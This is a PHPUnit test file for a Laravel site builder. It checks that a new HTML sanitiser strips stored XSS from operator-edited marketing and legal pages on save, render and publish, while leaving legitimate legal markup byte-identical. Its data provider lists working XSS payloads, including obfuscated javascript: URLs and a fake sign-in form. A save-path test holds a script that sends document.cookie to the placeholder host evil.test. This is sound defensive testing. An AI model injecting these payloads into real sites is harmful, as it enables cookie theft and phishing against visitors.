<?php

namespace Tests\Feature;

use App\Models\PlatformUser;
use App\Models\SitePage;
use App\Support\DefaultSiteContent;
use App\Support\HtmlSanitizer;
use Database\Seeders\SiteContentSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use PHPUnit\Framework\Attributes\DataProvider;
use ReflectionMethod;
use Tests\TestCase;

/**
 * STORED XSS IN OPERATOR-PUBLISHED HTML.
 *
 * `rich_text` blocks are rendered with `dangerouslySetInnerHTML` on the public
 * marketing site — /privacy, /terms and /security are now ENTIRELY rich_text —
 * and the Site Builder save path validated only `blocks => present|array`.
 * There was no sanitiser anywhere in the codebase, while comments in
 * RichText.jsx and SitePage.php asserted that one ran "server-side on save".
 *
 * The builder is platform-operator-only, so this is a privileged surface rather
 * than an anonymous one. That bounds the likelihood, not the impact: the output
 * is served to every visitor, on the pages a visitor is most likely to trust,
 * and an operator account is precisely what a phisher goes after.
 *
 * This file asserts both halves of the fix:
 *   1. real attack payloads do not survive, on SAVE and on RENDER; and
 *   2. the genuine legal-page markup is returned BYTE-IDENTICAL, because a
 *      sanitiser that quietly mangles a privacy policy is its own defect.
 */
class SiteContentSanitizationTest extends TestCase
{
    use RefreshDatabase;

    /**
     * Payloads => a fragment that must not appear in the sanitised output.
     * Kept as (payload, forbidden-substring) pairs so a partial escape (say,
     * the tag stripped but the handler left on a surviving element) still fails.
     *
     * @return array<string, array{0:string, 1:list<string>}>
     */
    public static function payloads(): array
    {
        return [
            'script tag' => ['<p>hi</p><script>alert(1)</script>', ['<script', 'alert(1)']],
            'script with src' => ['<SCRIPT SRC="https://evil.test/x.js"></SCRIPT>', ['script', 'evil.test']],
            'img onerror' => ['<img src=x onerror="alert(1)">', ['onerror', 'alert(1)']],
            'body onload' => ['<div onmouseover="alert(1)">hover</div>', ['onmouseover', 'alert(1)']],
            'javascript url' => ['<a href="javascript:alert(1)">click</a>', ['javascript:', 'alert(1)']],
            'javascript url obfuscated' => ['<a href="jAvAs&#99;ript:alert(1)">click</a>', ['alert(1)']],
            'javascript url padded' => ['<a href="  java&#09;script:alert(1)">click</a>', ['alert(1)']],
            'vbscript url' => ['<a href="vbscript:msgbox(1)">click</a>', ['vbscript:']],
            'data url' => ['<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', ['data:text/html']],
            'data url image src' => ['<img src="data:text/html;base64,PHNjcmlwdD4=">', ['data:text/html']],
            'iframe' => ['<iframe src="https://evil.test/phish"></iframe>', ['<iframe', 'evil.test']],
            'object' => ['<object data="https://evil.test/x.swf"></object>', ['<object', 'evil.test']],
            'embed' => ['<embed src="https://evil.test/x">', ['<embed', 'evil.test']],
            'style block' => ['<style>body{display:none}</style><p>x</p>', ['<style', 'display:none']],
            'style attribute overlay' => [
                '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999">Sign in again</p>',
                ['style=', 'position:fixed'],
            ],
            'style expression' => ['<p style="width:expression(alert(1))">x</p>', ['expression', 'style=']],
            'svg onload' => ['<svg onload="alert(1)"></svg>', ['svg', 'onload', 'alert(1)']],
            'math href' => ['<math><maction actiontype="statusline#https://evil.test">x</maction></math>', ['math', 'evil.test']],
            'credential form' => [
                '<form action="https://evil.test/collect"><input type="password" name="p"><button>Sign in</button></form>',
                ['<form', '<input', 'evil.test'],
            ],
            'conditional comment' => ['<!--[if IE]><script>alert(1)</script><![endif]--><p>ok</p>', ['script', 'alert(1)']],
            'base tag hijack' => ['<base href="https://evil.test/"><p>x</p>', ['<base', 'evil.test']],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.test">', ['<meta', 'evil.test']],
            'srcdoc' => ['<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', ['srcdoc', 'iframe']],
            'noscript smuggle' => ['<noscript><p title="</noscript><script>alert(1)</script>">x</p></noscript>', ['<script', 'alert(1)']],
            'template smuggle' => ['<template><script>alert(1)</script></template>', ['script', 'alert(1)']],
        ];
    }

    /**
     * @param  list<string>  $forbidden
     */
    #[DataProvider('payloads')]
    public function test_attack_payloads_do_not_survive_sanitisation(string $payload, array $forbidden): void
    {
        $clean = HtmlSanitizer::clean($payload);

        foreach ($forbidden as $needle) {
            $this->assertStringNotContainsStringIgnoringCase(
                $needle,
                $clean,
                "Sanitised output still contains '{$needle}'. Input was: {$payload}"
            );
        }
    }

    /**
     * The sanitiser runs on save AND again on render, so it must be a fixed
     * point — otherwise the second pass would slowly rewrite live content.
     */
    /**
     * @param  list<string>  $forbidden
     */
    #[DataProvider('payloads')]
    public function test_sanitisation_is_idempotent(string $payload, array $forbidden): void
    {
        $once = HtmlSanitizer::clean($payload);

        $this->assertSame($once, HtmlSanitizer::clean($once));
    }

    /**
     * THE OTHER HALF OF THE BUG. /privacy, /terms, /security, /about and
     * /download are rich_text end to end. If sanitising them changed a single
     * byte — a swallowed em dash, a re-encoded apostrophe, a dropped <strong>
     * inside a list item — the fix would have silently rewritten the published
     * legal text of the product.
     *
     * This reads the REAL launch copy out of SiteContentSeeder (rather than a
     * hand-copied sample that could drift) and demands byte identity.
     */
    public function test_the_real_marketing_and_legal_markup_is_returned_untouched(): void
    {
        $htmlValues = $this->seederHtmlValues();

        $this->assertNotEmpty($htmlValues, 'Found no rich_text html in SiteContentSeeder — the guard would be vacuous.');

        foreach ($htmlValues as $slug => $blocks) {
            foreach ($blocks as $index => $html) {
                $this->assertSame(
                    $html,
                    HtmlSanitizer::clean($html),
                    "Sanitising rich_text block #{$index} on the '{$slug}' page changed the published copy."
                );
            }
        }
    }

    /** The specific constructs the legal pages depend on, named so a regression says which one broke. */
    public function test_legitimate_legal_markup_constructs_survive(): void
    {
        $cases = [
            '<h2>1. Who does what</h2>',
            '<h3>Sub-heading</h3>',
            '<p>Plain paragraph.</p>',
            '<p><strong>Your employer decides</strong> what is switched on.</p>',
            '<p>the <strong>domain</strong> — for example <em>example.com</em> — not the full address</p>',
            '<ul><li><strong>We have not been audited</strong> against SOC 2.</li></ul>',
            '<ol><li>Create a workspace, or sign in to the one you have.</li></ol>',
            '<p>write to <a href="mailto:hello@staffvora.com">hello@staffvora.com</a></p>',
            '<p>published on our <a href="/pricing">pricing page</a></p>',
            '<p>Staffvora is provided "as is" and "as available".</p>',
            '<p>your organisation\'s employees\' working time</p>',
            '<p>7 days on Free, 90 days on Starter, 1 year on Growth &amp; unlimited on Enterprise.</p>',
            '<hr>',
        ];

        foreach ($cases as $html) {
            $this->assertSame($html, HtmlSanitizer::clean($html), "Legitimate markup was altered: {$html}");
        }
    }

    /**
     * SAVE PATH. An operator posting a payload through the builder must not be
     * able to store it — the row itself has to be clean, so that a later reader
     * that forgets to sanitise still cannot serve an attack.
     */
    public function test_the_builder_save_path_strips_markup_before_it_is_stored(): void
    {
        DefaultSiteContent::ensure();
        $page = SitePage::where('slug', 'home')->firstOrFail();

        $operator = PlatformUser::create([
            'name' => 'Operator',
            'email' => 'op@platform.test',
            'password' => 'operator-secret-pw',
            'role' => 'owner',
        ]);

        $this->actingAs($operator, 'platform')
            ->put(route('platform.site.save', $page), [
                'title' => 'Home',
                'meta_title' => null,
                'meta_description' => null,
                'blocks' => [[
                    'id' => 'b1',
                    'type' => 'rich_text',
                    'data' => ['html' => '<h2>Fine</h2><script>fetch("https://evil.test/"+document.cookie)</script><p onclick="alert(1)">x</p>'],
                ]],
            ])->assertRedirect();

        $stored = json_encode($page->fresh()->blocks, JSON_UNESCAPED_SLASHES);

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('evil.test', $stored);
        $this->assertStringNotContainsString('onclick', $stored);
        $this->assertStringContainsString('<h2>Fine</h2>', $stored);
    }

    /**
     * RENDER PATH — the defence-in-depth half.
     *
     * Every legal page currently in a production database was written before a
     * sanitiser existed, so "we clean on save" protects nothing that is already
     * stored. This writes a hostile row STRAIGHT TO THE TABLE, bypassing the
     * model entirely (exactly what a future import path or a pre-fix row looks
     * like), and asserts the public renderer still refuses to serve it.
     */
    public function test_a_hostile_row_written_around_the_model_is_still_cleaned_on_render(): void
    {
        $blocks = [[
            'id' => 'b1',
            'type' => 'rich_text',
            'data' => ['html' => '<p>Legit copy.</p><script>alert(1)</script><a href="javascript:alert(2)">Sign in</a>'],
        ]];

        DB::table('site_pages')->insert([
            'slug' => 'legacy-page',
            'title' => 'Legacy',
            'meta_title' => 'Legacy',
            'meta_description' => 'A row written before the sanitiser existed.',
            'status' => 'published',
            'blocks' => json_encode($blocks),
            'published_blocks' => json_encode($blocks),
            'sort' => 99,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $payload = SitePage::published('legacy-page')->publicPayload();
        $html = $payload['blocks'][0]['data']['html'];

        $this->assertStringNotContainsString('<script', $html);
        $this->assertStringNotContainsString('alert(1)', $html);
        $this->assertStringNotContainsString('javascript:', $html);
        $this->assertStringContainsString('Legit copy.', $html);

        // …and end to end, through the actual public route.
        $response = $this->get('/legacy-page');
        $response->assertOk();
        $response->assertDontSee('alert(1)', false);
        $response->assertDontSee('javascript:alert', false);
    }

    /** Publishing copies draft → live; the live snapshot must be clean too. */
    public function test_publishing_cannot_promote_unsanitised_markup(): void
    {
        $page = SitePage::create([
            'slug' => 'promo-page',
            'title' => 'Promo',
            'status' => 'draft',
            'blocks' => [[
                'id' => 'b1',
                'type' => 'rich_text',
                'data' => ['html' => '<p>ok</p><iframe src="https://evil.test"></iframe>'],
            ]],
            'published_blocks' => [],
            'sort' => 50,
        ]);

        $page->publish();

        $live = json_encode($page->fresh()->published_blocks, JSON_UNESCAPED_SLASHES);

        $this->assertStringNotContainsString('iframe', $live);
        $this->assertStringNotContainsString('evil.test', $live);
        $this->assertStringContainsString('<p>ok</p>', $live);
    }

    /**
     * Pull every `html` value out of the seeder's page definitions without
     * touching the database, so this stays a pure content check.
     *
     * @return array<string, list<string>>
     */
    private function seederHtmlValues(): array
    {
        $method = new ReflectionMethod(SiteContentSeeder::class, 'pages');
        $method->setAccessible(true);

        $out = [];

        foreach ($method->invoke(new SiteContentSeeder) as $slug => $definition) {
            $found = [];
            $this->collectHtml($definition['blocks'] ?? [], $found);

            if ($found !== []) {
                $out[$slug] = $found;
            }
        }

        return $out;
    }

    /** @param  list<string>  $found */
    private function collectHtml(array $node, array &$found): void
    {
        foreach ($node as $key => $value) {
            if (is_array($value)) {
                $this->collectHtml($value, $found);
            } elseif ($key === 'html' && is_string($value)) {
                $found[] = $value;
            }
        }
    }
}
